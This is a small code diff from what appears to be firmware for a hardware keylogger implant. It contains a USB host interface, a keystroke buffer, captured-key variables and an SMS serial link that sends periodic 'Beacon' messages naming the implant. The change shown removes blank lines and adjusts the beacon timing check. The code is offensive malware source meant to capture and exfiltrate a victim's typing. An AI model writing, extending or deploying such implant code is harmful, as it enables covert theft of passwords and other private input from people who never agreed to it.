@@ -11,7 +11,6 @@
 #include "utils.h"
 #include "globals.h"
 
-
 //USBhost = C_USBhost(Serial1, /*debug_state*/false);
 C_USBhost USBhost = C_USBhost(Serial1, DEBUG);
 SoftwareSerial SMSSERIAL(8, 9);
@@ -28,7 +27,6 @@ byte captured_key;
 bool pendingSMS = false;
 String buffer_keystrokes = "";
 unsigned int pendingLength = 0;
-
 
 void setup(){
   delay(300);                                              
@@ -59,7 +57,7 @@ void loop(){
 
   // Send a beacon so we know that the implant is up
   // ToDo: this can infere with payloads execution
-  if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) > BEACON_TIME){
+  if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) >= BEACON_TIME){
       String msg = "Beacon - ";
       msg += IMPLANT_NAME;
 #ifdef DEBUG
